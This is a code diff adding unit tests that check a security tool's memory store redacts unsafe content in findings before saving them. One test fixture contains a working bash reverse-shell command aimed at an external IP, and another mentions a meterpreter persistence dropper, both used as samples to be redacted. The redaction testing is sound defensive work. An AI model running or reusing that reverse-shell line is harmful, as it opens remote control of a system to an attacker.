@@ -142,3 +142,74 @@ describe('RuvSecurityMemory — patch + genome memory (reuse)', () => {
 function round(v: number): number {
   return +(Math.round(v * 1e6) / 1e6).toFixed(6);
 }
+
+// `compounding.ts`/`ablation.ts` call `writeConfirmed`/`writeFalsePositive` directly
+// with raw, corpus-derived findings — unlike `runSwarm`/`runAgenticLoop`, which only
+// ever reach memory through `gateOutputs()`. These two methods are the only other
+// door into persistent memory, so they must gate for themselves (ADR-155 §safety
+// controls: "any string that would leave the sandbox").
+describe('RuvSecurityMemory — writeConfirmed/writeFalsePositive gate unsafe content', () => {
+  function unsafeFinding(overrides: Partial<Finding> = {}): Finding {
+    return {
+      id: 'u1',
+      repo: 'r',
+      commit: 'c',
+      file: 'src/handler.ts',
+      symbol: 'handle',
+      weakness: 'CWE-78 OS command injection',
+      confidence: 0.9,
+      evidence: ['PoC: bash -i >& /dev/tcp/1.2.3.4/9001 0>&1'],
+      patch: 'drop a meterpreter dropper for persistence',
+      verdict: 'confirmed',
+      exploitCodeAllowed: false,
+      ...overrides,
+    };
+  }
+
+  it('writeConfirmed redacts unsafe evidence before it reaches confirmedFindings', () => {
+    const mem = new RuvSecurityMemory();
+    mem.writeConfirmed(unsafeFinding());
+    const stored = mem.confirmedFindings.all().map((e) => e.payload);
+    expect(stored).toHaveLength(1);
+    expect(stored[0].evidence[0]).not.toMatch(/\/dev\/tcp/);
+    expect(stored[0].evidence[0]).toContain('[REDACTED:unsafe-content]');
+  });
+
+  it('writeConfirmed redacts an unsafe patch before it reaches the patch collection', () => {
+    const mem = new RuvSecurityMemory();
+    mem.writeConfirmed(unsafeFinding({ test: 'reject the malicious input' }));
+    const patches = mem.retrievePatches('OS command injection', 3);
+    expect(patches.length).toBeGreaterThan(0);
+    expect(patches[0].patch).not.toMatch(/meterpreter/);
+    expect(patches[0].patch).toContain('[REDACTED:unsafe-content]');
+  });
+
+  it('writeFalsePositive redacts unsafe evidence before it reaches falsePositives', () => {
+    const mem = new RuvSecurityMemory();
+    mem.writeFalsePositive(unsafeFinding({ id: 'u2', verdict: 'false_positive' }));
+    const stored = mem.falsePositives.all().map((e) => e.payload);
+    expect(stored).toHaveLength(1);
+    expect(stored[0].evidence[0]).toContain('[REDACTED:unsafe-content]');
+  });
+
+  it('a clean finding is stored byte-identical (no regression for the gated callers)', () => {
+    const mem = new RuvSecurityMemory();
+    const clean: Finding = {
+      id: 'c2',
+      repo: 'r',
+      commit: 'c',
+      file: 'src/query.ts',
+      symbol: 'buildQuery',
+      weakness: 'CWE-89 SQL injection',
+      confidence: 0.9,
+      evidence: ['user input reaches the query builder unsanitized'],
+      patch: 'use parameterized queries',
+      test: 'reject injection input',
+      verdict: 'confirmed',
+      exploitCodeAllowed: false,
+    };
+    mem.writeConfirmed(clean);
+    const stored = mem.confirmedFindings.all().map((e) => e.payload);
+    expect(stored).toEqual([clean]);
+  });
+});
